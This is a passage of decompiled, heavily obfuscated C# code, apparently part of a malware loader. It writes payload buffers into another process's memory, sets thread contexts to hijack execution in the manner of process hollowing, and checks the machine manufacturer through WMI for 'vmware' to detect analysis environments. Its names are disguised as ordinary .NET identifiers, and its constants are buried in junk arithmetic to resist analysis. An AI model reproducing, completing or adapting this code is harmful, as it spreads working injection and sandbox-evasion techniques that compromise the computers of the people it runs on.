        int num12 = \u003CModule\u003E.\u00BE\u0017\u003EkO(_param2, num8 + (Convert.ToInt32(2.0 * -57365.5) + Convert.ToInt32(41469.0 - Math.Truncate(13823.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")) + Convert.ToInt32(2.0 * 43552.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("10"))) * (Convert.ToInt32(28106.0 + Math.Tanh(14053.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4")) + Convert.ToInt32(53197.575102036819 + Math.Log10(26601.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("13")) - Convert.ToInt32(121962.0 - 40654.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("4"))));
        if (length != 0)
        {
          byte[] lpBuffer2 = new byte[length];
          \u003CModule\u003E.\u000D\u0016Ù\u0006z((Array) _param2, num12, (Array) lpBuffer2, Convert.ToInt32(2.0 * -52295.5) + Convert.ToInt32(49065.610213937682 + Math.Log10(24535.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) + Convert.ToInt32(2.0 * 27760.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")) - Type.EmptyTypes.Length - Type.EmptyTypes.Length, lpBuffer2.Length);
          int num13 = get_UI.GetThreadLocalContext(bljAlgdgocj.Get_CustomMarshaler, lpBaseAddress + num11, lpBuffer2, lpBuffer2.Length, out lpNumberOfBytesWritten) ? 1 : 0;
        }
        num8 += (Convert.ToInt32(2.0 * -95644.5) + Convert.ToInt32(98247.0135274442 - Math.Cos(49123.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) + Convert.ToInt32(93092.748088923516 - Math.Log(46541.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12"))) * (Convert.ToInt32(-18573.0 - -6191.0) + Convert.ToInt32(3953.7036639453981 + Math.Log10(1978.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("1")) + Convert.ToInt32(8427.0 - Math.Tanh(4213.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12")));
        num10 += Convert.ToInt32(-73947.0 - -24649.0) + Convert.ToInt32(17563.5 + 17563.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("10")) + Convert.ToInt32(14163.134123714575 + Math.Log(7086.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2"));
      }
      while (num10 <= (int) num9 - (Convert.ToInt32(2.0 * -62544.0) + Convert.ToInt32(93255.0 + Math.Tanh(46628.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6")) + Convert.ToInt32(31842.675111585981 - Math.Log(15916.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("13"))));
      byte[] lpBuffer3 = \u003CModule\u003E.y3ÏÀ\u0017(lpBaseAddress);
      int num14 = get_UI.GetThreadLocalContext(bljAlgdgocj.Get_CustomMarshaler, num5 + (Convert.ToInt32(-55399.5 - 55399.5) + Convert.ToInt32(30275.0 + Math.Truncate(30274.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7")) + Convert.ToInt32(25129.0 + Math.Floor(25129.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5"))) * (Convert.ToInt32(309556962.0 / -12441.0) + Convert.ToInt32(76817.887749282352 - Math.Tan(38409.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("3")) - Convert.ToInt32(77903.0 - Math.Round(25967.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("13"))), lpBuffer3, (Convert.ToInt32(-5271.5 - 5271.5) + Convert.ToInt32(496786720.5 / 15760.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) - Convert.ToInt32(31461.0 - 10487.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("11"))) * (Convert.ToInt32(-83576.5 - 83576.5) + Convert.ToInt32(83552.0 - Math.Tanh(41775.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("3")) + Convert.ToInt32(41801.0 + Math.Ceiling(41801.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5"))), out lpNumberOfBytesWritten) ? 1 : 0;
      int num15 = \u003CModule\u003E.\u00BE\u0017\u003EkO(_param2, num1 + (Convert.ToInt32(34348.698819502642 + Math.Sqrt(17240.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5")) + Convert.ToInt32(25998.0 - 8666.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("7")) - Convert.ToInt32(51771.0 + Math.Tanh(25886.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4"))) * (Convert.ToInt32(2.0 * -60559.5) + Convert.ToInt32(57160.0 - Math.Tanh(28579.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("11")) + Convert.ToInt32(63960.208528041221 - Math.Sin(31980.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("6"))));
      if (flag)
        lpBaseAddress = num2;
      context[(Convert.ToInt32(2.0 * -45294.0) + Convert.ToInt32(40971.927252906084 - Math.Log(20481.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("4")) + Convert.ToInt32(49669.348110587685 - Math.Sin(24835.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("10"))) * (Convert.ToInt32(2.0 * -80356.5) + Convert.ToInt32(70205.106921304367 - Math.Sqrt(35009.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("3")) + Convert.ToInt32(136044.0 - Math.Floor(45348.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")))] = lpBaseAddress + num15;
      \u003CModule\u003E.\u0091Ú\u001C\u00AD\u005C((Convert.ToInt32(505.0 + Math.Round(505.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("13")) + Convert.ToInt32(16861.0 - Math.Round(5620.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) - Convert.ToInt32(11675.344928413053 + Math.Sqrt(5876.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14"))) * (Convert.ToInt32(73134.0 + Math.Tanh(36567.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) + Convert.ToInt32(11962.928422963518 + Math.Tan(5980.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9")) - Convert.ToInt32(42547.0 + Math.Round(42547.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5"))));
      if (\u003CModule\u003E.\u00A1K\u007F\u008B\u001E() != (Convert.ToInt32(11838911688.0 / -76938.0) + Convert.ToInt32(2.0 * 42984.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("4")) + Convert.ToInt32(33956.0 + Math.Floor(33956.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("3"))) * (Convert.ToInt32(-70166.0 - 70166.0) + Convert.ToInt32(93810.521932047457 - Math.Cos(46905.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) + Convert.ToInt32(23261.5 + 23261.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("13"))))
      {
        int num16 = get_UI.M_assemblyData(bljAlgdgocj.CreateSemaphore, context) ? 1 : 0;
      }
      else
      {
        int num17 = get_UI.Set_MethodSemanticsTable(bljAlgdgocj.CreateSemaphore, context) ? 1 : 0;
      }
      int num18 = (int) get_UI.Set_ModuleName(bljAlgdgocj.CreateSemaphore);
      ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator = (ManagementObjectCollection.ManagementObjectEnumerator) \u003CModule\u003E.Uøµî\u002F(\u003CModule\u003E.ßaù\u008B\u002B(\u003CModule\u003E.TÚ\u008C\u00B6\u001E("Select * from Win32_ComputerSystem")));
      try
      {
        while (\u003CModule\u003E.\u008E\u00A8uE\u0097((object) objectEnumerator))
        {
          ManagementBaseObject managementBaseObject = (ManagementBaseObject) \u003CModule\u003E.\u00A7\u00A9\u009B\u001FÃ((object) objectEnumerator);
          string str = \u003CModule\u003E.Åw\u008F\u008D8((object) \u003CModule\u003E.\u0017s\u002EÇÒ(\u003CModule\u003E.\u0090\u003B\u0080Ó\u003B((object) managementBaseObject, "Manufacturer")));
          if (!\u003CModule\u003E.\u003CâµËÅ((object) str, "microsoft corporation"))
          {
            int num19 = \u003CModule\u003E.\u003CâµËÅ((object) str, "vmware") ? 1 : 0;
          }
        }
      }
      finally
      {
        if (objectEnumerator != null)
          \u003CModule\u003E.\u0060\u0095\u005Có\u009F((object) objectEnumerator);
      }
      return Convert.ToInt32(21479.0 + Math.Floor(21478.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("5")) + Convert.ToInt32(6525.0 + Math.Abs(6525.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) - Convert.ToInt32(28003.0 + Math.Round(28003.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("1")) != 0;
    }
    catch (Exception ex)
    {
      \u003CModule\u003E.ôL\u003E3\u0029(\u003CModule\u003E.\u0017s\u002EÇÒ((object) ex));
      \u003CModule\u003E.â\u002D\u0006\u001E\u009E(\u003CModule\u003E.\u009A\u00AC\u009E\u0091C(\u003CModule\u003E.ÚE\u008A\u0009\u0040(bljAlgdgocj.GetObjectInternal)));
      return Convert.ToInt32(68937.462546117575 + Math.Log10(34471.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) + Convert.ToInt32(7506.0 + Math.Round(7506.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("1")) - (int.Parse("260121801") ^ int.Parse("260072251")) / \u003CModule\u003E.TimeSpanToken(int.Parse("1")) - Type.EmptyTypes.Length - Type.EmptyTypes.Length != 0;
    }
  }

  public delegate void IsNestedFamily();

  public delegate double Set_Cookie(int p, byte b, short s);

  public delegate void Get_ConfigurationFile();

  public delegate double BinaryCompatibility(int p, byte b, short s);

  public delegate bool SAM1159(IntPtr thread, int[] context);

  public delegate bool Stable(IntPtr thread, int[] context);

  public delegate bool PreSearchPaths(
    IntPtr hProcess,
    int lpBaseAddress,
    int lpBuffer,
    int dwSize,
    ref int lpNumberOfBytesRead);

  public delegate int DefaultPropertyAttribute(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect);

  public delegate bool BasicHostType(
    IntPtr hProcess,
    int lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out int lpNumberOfBytesWritten);

  public delegate bool DefaultCalendar(IntPtr thread, int[] context);

  public delegate bool RecursionDecrement(IntPtr thread, int[] context);

  public delegate uint GetMethodProps(IntPtr hThread);

  public delegate bool ArraySig(
    IntPtr hToken,
    string lpApplicationName,
    string lpCommandLine,
    IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes,
    bool bInheritHandles,
    uint dwCreationFlags,
    IntPtr lpEnvironment,
    string lpCurrentDirectory,
    ref get_UI.Set_HasFieldRVA startupInfo,
    ref get_UI.FullAppCompatMatch bljAlgdgocj);

  public struct FullAppCompatMatch
  {
    public readonly IntPtr Get_CustomMarshaler;
    public readonly IntPtr CreateSemaphore;
    public readonly uint GetObjectInternal;
    private readonly uint ToFileSecurityState;
  }

  public struct Set_HasFieldRVA
  {
    public uint Set_LocalSig;
    private readonly string AddToCleanupList;
    private readonly string ByValStr;
    private readonly string RoundPower10Double;
    private readonly byte[] get_LogicalCallContext;
    private readonly IntPtr M_userObjectInternal;
    private readonly IntPtr GetCurrentState;
    private readonly IntPtr SequencePointHelper;
    private readonly IntPtr BeginCreateTables;
  }
}
